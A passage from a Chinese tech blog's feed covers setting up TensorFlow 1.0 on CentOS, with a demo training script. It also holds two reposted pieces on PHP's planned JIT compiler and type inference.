href="#三、深度学习环境搭建" class="headerlink" title="三、深度学习环境搭建"></a>三、深度学习环境搭建</h3><p>在2个月前，人工智能对我来说，只是一个高大上的概念。但是，经过一个多月的业余时间的认真学习，我发现还是能够学到一些东西，并且跑一些demo和应用出来的。</p><p><strong>1. 学习的提前准备</strong></p><p>（1）部分数学内容的复习，高中数学、概率、线性代数等部分内容。（累计花费了10个小时，挑了关键的点看了下，其实还是不太够，只能让自己看公式的时候，相对没有那么懵）</p><p>（2）Python基础语法学习。（花费了3个小时左右，我以前从未写过Python，因为后面Google的TensorFlow框架的使用是基于Python的）</p><p>（3）Google的TensorFlow深度学习开源框架。（花费了10多个小时去看）</p><p>数学基础好或者前期先不关注原理的同学，数学部分不看也可以开始做，全凭个人选择。</p><p><strong>2. Google的TensorFlow开源深度学习框架</strong></p><p>深度学习框架，我们可以粗略的理解为是一个“数学函数”集合和AI训练学习的执行框架。通过它，我们能够更好的将AI的模型运行和维护起来。</p><p>深度学习的框架有各种各样的版本（Caffe、Torch、Theano等等），我只接触了Google的TensorFlow，因此，后面的内容都是基于TensorFlow展开的，它的详细介绍这里不展开讲述，建议直接进入官网查看。非常令人庆幸的是TensorFlow比较早就有中文社区了，尽管里面的内容有一点老，搭建环境方面有一些坑，但是已经属于为数不多的中文文档了，大家且看且珍惜。</p><p><a href="http://www.tensorfly.cn/" target="_blank" rel="noopener">TensorFlow 的中文社区</a></p><p><a href="https://www.tensorflow.org/" target="_blank" rel="noopener">TensorFlow 的英文社区</a></p><p><strong>3. TensorFlow环境搭建</strong></p><p>环境搭建本身并不复杂，主要解决相关的依赖。但是，基础库的依赖可以带来很多问题，因此，建议尽量一步到位，会简单很多。</p><p><strong>（1）操作系统</strong></p><p>我搭建环境使用的机器是腾讯云上的机器，软件环境如下：</p><p>操作系统：CentOS 7.2 64位（GCC 4.8.5）</p><p>因为这个框架依赖于python2.7和glibc 2.17。比较旧的版本的CentOS一般都是python2.6以及版本比较低的glibc，会产生比较的多基础库依赖问题。而且，glibc作为Linux的底层库，牵一发动全身，直接对它升级是比较复杂，很可能会带来更多的环境异常问题。</p><p><strong>（2）软件环境</strong></p><p>我目前安装的Python版本是python-2.7.5，建议可以采用yum install python的方式安装相关的原来软件。然后，再安装 python内的组件包管理器pip，安装好pip之后，接下来的其他软件的安装就相对比较简单了。</p><p>例如安装TensorFlow，可通过如下一句命令完成（它会自动帮忙解决一些库依赖问题）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U tensorflow</span><br></pre></td></tr></table></figure><p>这里需要特别注意的是，不要按照TensorFlow的中文社区的指引去安装，因为它会安装一个非常老的版本（0.5.0），用这个版本跑很多demo都会遇到问题的。而实际上，目前通过上述提供的命令安装，是tensorflow (1.0.0)的版本了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835098838_424_1487835093742.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>Python（2.7.5）下的其他需要安装的关键组件：</p><ul><li>tensorflow (0.12.1)，深度学习的核心框架</li><li>image (1.5.5)，图像处理相关，部分例子会用到</li><li>PIL (1.1.7)，图像处理相关，部分例子会用到</li></ul><p>除此之后，当然还有另外的一些依赖组件，通过pip list命令可以查看我们安装的python组件：</p><ul><li>appdirs (1.4.0)</li><li>backports.ssl-match-hostname (3.4.0.2)</li><li>chardet (2.2.1)</li><li>configobj (4.7.2)</li><li>decorator (3.4.0)</li><li>Django (1.10.4)</li><li>funcsigs (1.0.2)</li><li>image (1.5.5)</li><li>iniparse (0.4)</li><li>kitchen (1.1.1)</li><li>langtable (0.0.31)</li><li>mock (2.0.0)</li><li>numpy (1.12.0)</li><li>packaging (16.8)</li><li>pbr (1.10.0)</li><li>perf (0.1)</li><li>PIL (1.1.7)</li><li>Pillow (3.4.2)</li><li>pip (9.0.1)</li><li>protobuf (3.2.0)</li><li>pycurl (7.19.0)</li><li>pygobject (3.14.0)</li><li>pygpgme (0.3)</li><li>pyliblzma (0.5.3)</li><li>pyparsing (2.1.10)</li><li>python-augeas (0.5.0)</li><li>python-dmidecode (3.10.13)</li><li>pyudev (0.15)</li><li>pyxattr (0.5.1)</li><li>setuptools (34.2.0)</li><li>six (1.10.0)</li><li>slip (0.4.0)</li><li>slip.dbus (0.4.0)</li><li>tensorflow (1.0.0)</li><li>urlgrabber (3.10)</li><li>wheel (0.29.0)</li><li>yum-langpacks (0.4.2)</li><li>yum-metadata-parser (1.1.4)</li></ul><p>按照上述提供的来搭建系统，可以规避不少的环境问题。</p><p>搭建环境的过程中，我遇到不少问题。例如：在跑官方的例子时的某个报错，AttributeError: ‘module’ object has no attribute ‘gfile’，就是因为安装的TensorFlow的版本比较老，缺少gfile模块导致的。而且，还有各种各样的。（不要问我是怎么知道的，说多了都是泪啊~）</p><p>更详细的安装说明：<a href="https://www.tensorflow.org/install/install_linux" target="_blank" rel="noopener">Installing TensorFlow on Ubuntu</a></p><p><strong>（3）TensorFlow环境测试运行</strong></p><p>测试是否安装成功，可以采用官方的提供的一个短小的例子，demo生成了一些三维数据, 然后用一个平面拟合它们（官网的例子采用的初始化变量的函数是initialize_all_variables，该函数在新版本里已经被废弃了）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">import tensorflow as tf</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"># 使用 NumPy 生成假数据(phony data), 总共 100 个点.</span><br><span class="line">x_data = np.float32(np.random.rand(2, 100)) # 随机输入</span><br><span class="line">y_data = np.dot([0.100, 0.200], x_data) + 0.300</span><br><span class="line"></span><br><span class="line"># 构造一个线性模型</span><br><span class="line"># </span><br><span class="line">b = tf.Variable(tf.zeros([1]))</span><br><span class="line">W = tf.Variable(tf.random_uniform([1, 2], -1.0, 1.0))</span><br><span class="line">y = tf.matmul(W, x_data) + b</span><br><span class="line"></span><br><span class="line"># 最小化方差</span><br><span class="line">loss = tf.reduce_mean(tf.square(y - y_data))</span><br><span class="line">optimizer = tf.train.GradientDescentOptimizer(0.5)</span><br><span class="line">train = optimizer.minimize(loss)</span><br><span class="line"></span><br><span class="line"># 初始化变量,旧函数（initialize_all_variables）已经被废弃，替换为新函数</span><br><span class="line">init = tf.global_variables_initializer()</span><br><span class="line"></span><br><span class="line"># 启动图 (graph)</span><br><span class="line">sess = tf.Session()</span><br><span class="line">sess.run(init)</span><br><span class="line"></span><br><span class="line"># 拟合平面</span><br><span class="line">for step in xrange(0, 201):</span><br><span class="line">    sess.run(train)</span><br><span class="line">    if step % 20 == 0:</span><br><span class="line">        print step, sess.run(W), sess.run(b)</span><br><span class="line"></span><br><span class="line"># 得到最佳拟合结果 W: [[0.100  0.200]], b: [0.300]</span><br></pre></td></tr></table></figure><p>运行的结果类似如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835204779_9711_1487835200218.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>经过200次的训练，模型的参数逐渐逼近最佳拟合的结果（W: [[0.100 0.200]], b: [0.300]），另外，我们也可以从代码的“风格”中，了解到框架样本训练的基本运行方式。虽然，官方的教程后续会涉及越来越多更复杂的例子，但从整体上看，也是类似的模式。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835221851_3503_1487835216851.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p><strong>步骤划分</strong></p><ul><li>准备数据：获得有标签的样本数据（带标签的训练数据称为有监督学习）；</li><li>设置模型：先构建好需要使用的训练模型，可供选择的机器学习方法其实也挺多的，换而言之就是一堆数学函数的集合；<br>损失函数和优化方式：衡量模型计算结果和真实标签值的差距；</li><li>真实训练运算：训练之前构造好的模型，让程序通过循环训练和学习，获得最终我们需要的结果“参数”；</li><li>验证结果：采用之前模型没有训练过的测试集数据，去验证模型的准确率。</li></ul><p>其中，TensorFlow为了基于python实现高效的数学计算，通常会使用到一些基础的函数库，例如Numpy（采用外部底层语言实现），但是，从外部计算切回到python也是存在开销的，尤其是在几万几十万次的训练过程。因此，Tensorflow不单独地运行单一的函数计算，而是先用图描述一系列可交互的计算操作流程，然后全部一次性提交到外部运行（在其他机器学习的库里，也是类似的实现）。</p><p>所以，上述流程图中，蓝色部分都只是设置了“计算操作流程”，而绿色部分开始才是真正的提交数据给到底层库进行实际运算，而且，每次训练一般是批量执行一批数据的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2017年围棋界发生了一件比较重要事，Master（Alphago）以60连胜横扫天下，击败各路世界冠军，人工智能以气势如虹的姿态出现在我们人类的面前。围棋曾经一度被称为“人类智慧的堡垒”，如今，这座堡垒也随之成为过去。从2016年三月份AlphaGo击败李世石开始，AI全面进入我们大众的视野，对于它的讨论变得更为火热起来，整个业界普遍认为，它很可能带来下一次科技革命，并且，在未来可预见的10多年里，深刻地改变我们的生活。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ai" scheme="http://www.twosee.cn/tags/ai/"/>
    
  </entry>
  
  <entry>
    <title>[转] PHP Next JIT</title>
    <link href="http://www.twosee.cn/2018/01/04/PHP-Next-JIT/"/>
    <id>http://www.twosee.cn/2018/01/04/PHP-Next-JIT/</id>
    <published>2018-01-03T21:28:57.000Z</published>
    <updated>2018-04-05T08:45:04.131Z</updated>
    
    <content type="html"><![CDATA[<p>12月23日，由开源中国联合中国电子技术标准化研究院主办的2017源创会年终盛典在北京万豪酒店顺利举行。作为年末最受期待的开源技术分享盛会，国内顶尖技术大拿、知名技术团队、优秀开源项目作者，及近1000名技术爱好者共聚一堂，探讨最前沿、最流行的技术话题和方向，推动国内开源创新体系发展，共建国内开源生态标准。PHP7 已发布近两年, 大幅的性能提升使得 PHP 的应用场景更加广泛，刚刚发布的 PHP7.2 相比 PHP7.1 又有了近 10% 的提升。在本次大会上，链家集团技术副总裁、PHP 开发组核心成员鸟哥发表了以 “ PHP Next: JIT ”为主题的演讲，分享了 PHP 的下一个性能提升的主要举措：JIT 的进展, 以及下一个大版本的 PHP 可能的特性。他表示，JIT 相比 PHP7.2 ，在一些场景可以达到三倍，但由于 JIT 的核心前提是类型推断，得到的信息越多效果越好，因此也容易受到限制。 JIT 发布后，随着更优秀的代码出现，性能提升会更明显。</p><h2 id="惠新宸"><a href="#惠新宸" class="headerlink" title="惠新宸"></a>惠新宸</h2><p>惠新宸 ，国内最有影响力的PHP技术专家， PHP开发组核心成员 , PECL开发者 , Zend公司外聘顾问, 曾供职于雅虎，百度，新浪。现任链家集团技术副总裁兼总架构师。PHP 7 的核心开发者，PHP5.4，5.5的主要开发者。也是Yaf (Yet another framework)，Yar(Yet another RPC framework) 以及Yac(Yet another Cache)、Taint等多个开源项目的作者，同时也是APC，Opcache ，Msgpack等项目的维护者。</p><h2 id="演讲实录"><a href="#演讲实录" class="headerlink" title="演讲实录"></a>演讲实录</h2><p><strong>PHP Next: JIT</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626739-1.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626740.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><a id="more"></a><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626740-1.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626741.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626742.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626742-1.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626743.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626743-1.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626744.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626744-1.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626745.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626745-1.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626746.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626746-1.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626747.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626747-1.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626747-2.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626748.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626748-1.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626749.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626749-1.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626750.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626750-1.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626750-2.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626751.jpeg" alt="鸟哥：PHP Next: JIT" title="">                </div>                <div class="image-caption">鸟哥：PHP Next: JIT</div>            </figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;12月23日，由开源中国联合中国电子技术标准化研究院主办的2017源创会年终盛典在北京万豪酒店顺利举行。作为年末最受期待的开源技术分享盛会，国内顶尖技术大拿、知名技术团队、优秀开源项目作者，及近1000名技术爱好者共聚一堂，探讨最前沿、最流行的技术话题和方向，推动国内开源创新体系发展，共建国内开源生态标准。PHP7 已发布近两年, 大幅的性能提升使得 PHP 的应用场景更加广泛，刚刚发布的 PHP7.2 相比 PHP7.1 又有了近 10% 的提升。在本次大会上，链家集团技术副总裁、PHP 开发组核心成员鸟哥发表了以 “ PHP Next: JIT ”为主题的演讲，分享了 PHP 的下一个性能提升的主要举措：JIT 的进展, 以及下一个大版本的 PHP 可能的特性。他表示，JIT 相比 PHP7.2 ，在一些场景可以达到三倍，但由于 JIT 的核心前提是类型推断，得到的信息越多效果越好，因此也容易受到限制。 JIT 发布后，随着更优秀的代码出现，性能提升会更明显。&lt;/p&gt;
&lt;h2 id=&quot;惠新宸&quot;&gt;&lt;a href=&quot;#惠新宸&quot; class=&quot;headerlink&quot; title=&quot;惠新宸&quot;&gt;&lt;/a&gt;惠新宸&lt;/h2&gt;&lt;p&gt;惠新宸 ，国内最有影响力的PHP技术专家， PHP开发组核心成员 , PECL开发者 , Zend公司外聘顾问, 曾供职于雅虎，百度，新浪。现任链家集团技术副总裁兼总架构师。PHP 7 的核心开发者，PHP5.4，5.5的主要开发者。也是Yaf (Yet another framework)，Yar(Yet another RPC framework) 以及Yac(Yet another Cache)、Taint等多个开源项目的作者，同时也是APC，Opcache ，Msgpack等项目的维护者。&lt;/p&gt;
&lt;h2 id=&quot;演讲实录&quot;&gt;&lt;a href=&quot;#演讲实录&quot; class=&quot;headerlink&quot; title=&quot;演讲实录&quot;&gt;&lt;/a&gt;演讲实录&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;PHP Next: JIT&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;image-bubble&quot;&gt;
                &lt;div class=&quot;img-lightbox&quot;&gt;
                    &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;
                    &lt;img src=&quot;http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626739-1.jpeg&quot; alt=&quot;鸟哥：PHP Next: JIT&quot; title=&quot;&quot;&gt;
                &lt;/div&gt;
                &lt;div class=&quot;image-caption&quot;&gt;鸟哥：PHP Next: JIT&lt;/div&gt;
            &lt;/figure&gt;
&lt;figure class=&quot;image-bubble&quot;&gt;
                &lt;div class=&quot;img-lightbox&quot;&gt;
                    &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;
                    &lt;img src=&quot;http://blog.p2hp.com/wp-content/uploads/2017/12/beepress-beepress-weixin-zhihu-jianshu-plugin-2-4-2-4899-1514626740.jpeg&quot; alt=&quot;鸟哥：PHP Next: JIT&quot; title=&quot;&quot;&gt;
                &lt;/div&gt;
                &lt;div class=&quot;image-caption&quot;&gt;鸟哥：PHP Next: JIT&lt;/div&gt;
            &lt;/figure&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://www.twosee.cn/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>[转] 2017年PHP开发者大会总结 鸟哥JIT篇</title>
    <link href="http://www.twosee.cn/2018/01/04/THE-NEXT-GENERATION-OF-PHP/"/>
    <id>http://www.twosee.cn/2018/01/04/THE-NEXT-GENERATION-OF-PHP/</id>
    <published>2018-01-03T21:21:37.000Z</published>
    <updated>2018-04-05T08:45:37.133Z</updated>
    
    <content type="html"><![CDATA[<p>鸟哥本次分享的主要内容是，在php7发布的这两年期间他们的主要工作，包括release的7.1和正在开发中的jit分支。说实话，由于本人水平有限，鸟哥分享的内容只能大概听懂意思，知道他们在做什么，但具体原理细节，鸟哥分享的我还真听不懂。这里就对鸟哥的分享内容做个总结。</p><h4 id="php7之后还有什么？JIT"><a href="#php7之后还有什么？JIT" class="headerlink" title="php7之后还有什么？JIT"></a>php7之后还有什么？JIT</h4><p>php7于15年正式发布，他的最大卖点是，无感知的100%性能提升，包含了运行速度与内存消耗。那么在此之后php该往哪里发展呢？目前已经在开发的一个大方向就是JIT</p><p><strong>JIT是什么？为什么是JIT？</strong><br>鸟哥并没有做过多的解释。我就谈一些我的肤浅认识，给phper们提供些参考。</p><p>首先JIT（just in time）并非是新技术，一大批语言如java早已实现。JIT的思想很简单，即在程序运行时动态对程序进行编译，生成平台相关的机器码，从而加快程序运行速度。</p><p>php文件的执行流程大致是首先引擎加载php文件，解释器逐条解释执行代码。引入JIT后，前面一样，重点是JIT编译器会根据Runtime信息对热点代码进行动态编译生成机器码，然后这部分代码以后就可以直接执行了，而不需要解释器逐条解释执行了，运行效率便得到了提升</p><p><code>看到这里不知道大家是否和我有一样的疑问，既然编译为机器码执行的效率那么高，为何不在项目正式部署前全部进行编译，何必在运行时编译？</code>要知道运行时编译也会增加程序的执行时间的。我在查阅了一些资料和一番思考后，有以下一些浅见</p><p>代码发布前先编译，是比JIT更早的通用办法，称为<code>AOT（ahead of time）</code>，c语言便是这种执行模式。关于这两种模式孰优孰劣，学术界一直争论不休，目前也没有定论。但JIT相比AOT有这样几个优点</p><ul><li><strong>发布速度快</strong>。不用每次都编译，发布速度自然快</li><li><strong>优化效率更好</strong>。因为JIT是基于Runtime信息，比AOT更“了解”代码，优化的效率更好。比如分析Runtime得知某个变量虽然声明是10个字节，但运行过程中一直是1个字节，那么就可以减小程序内存消耗；再比如某段代码始终未被执行，JIT则可以直接将其忽略</li><li><strong>粒度更精细</strong>。JIT可以只针对hotspot（热点）进行编译，热点可能是一个函数或者只是一个代码段</li><li><strong>对码农透明</strong>。JIT无须码农自己对程序根据不同平台进行编译发布，只需要写高级代码即可</li></ul><p>基于以上几个优点，再结合php一贯的简单易用原则，我想JIT确实是不错的选择。不过php也是支持AOT的，有兴趣的同学可以查一下。</p><a id="more"></a><p>但JIT技术也绝不是灵丹妙药，<code>即便是编译也是需要时间的，当代码编译的时间消耗大于运行收益时，程序反而会变慢！</code>会有这种情况吗？有的，比如某个项目中，热点并不明显，JIT编译的代码执行次数都很少，那么编译带来的收益是有可能小于编译本身的消耗的</p><p>以下是在标准测试中引入JIT技术后，php运行效率比7.2有100%的性能提升，不过在实际生产环境中效果不会有这么好</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://ww1.sinaimg.cn/large/006DQdzWgy1fn44fznqc8j317u0f6wg1.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h4 id="php7-1做了什么？类型预测"><a href="#php7-1做了什么？类型预测" class="headerlink" title="php7.1做了什么？类型预测"></a>php7.1做了什么？类型预测</h4><p>php要想实现JIT，有一个难题必须解决，那就是变量的<code>类型预测</code>。试想如果在动态编译时还要进行大量的类型检查，性能将会大打折扣。php7中已经可以对变量类型进行控制，7.1则是更加完善了这个机制，可以说目前php已经是半强类型语言了。但由于php的弱类型历史，仍有大量代码运行前是无法得知变量类型的，所以在7.1中鸟哥进行了大量变量类型预测的工作，为后续JIT打基础</p><p><strong>变量预测</strong><br>比较简单的一种办法是数据流分析，即分析代码的上下文，推断出变量的可能类型，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function calc ($a1, $b2) &#123;        // $a1: [ANY], $b2: [ANY]</span><br><span class="line">    $T3 = $a1 * 2;                // $T3: [LONG, DOUBLE]</span><br><span class="line">    $a4 = $T3 % 1000;             // $a4: [LONG]</span><br><span class="line">    $T5 = $b2 * 3;                // $T5: [LONG, DOUBLE]</span><br><span class="line">    $b6 = $T5 % 1000;             // $b6: [LONG]</span><br><span class="line">    $T7 = $a4 + $b6;              // $T7: [LONG, DOUBLE]</span><br><span class="line">    return $T7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这还是很困难的，鸟哥列举了一些开发过程中遇到的困难。比如变量的变量，<code>$$var_name</code>，或者顶层代码（即写在函数和类之外的代码）等等。php的历史包袱还是很重的。解决这些问题的简单办法就是强类型，但这又会降低开发效率，<code>因为优化而影响phper的开发效率</code>这是鸟哥所不愿意的，他认为业务永远是优先的，优化只是支线</p><p>目前鸟哥的解决办法就是对JIT进行分级，通过配置实现不同程度的动态编译，从而降低类型预测的难度。另外就是针对具体的场景，进行垂直优化</p><h4 id="问答环节"><a href="#问答环节" class="headerlink" 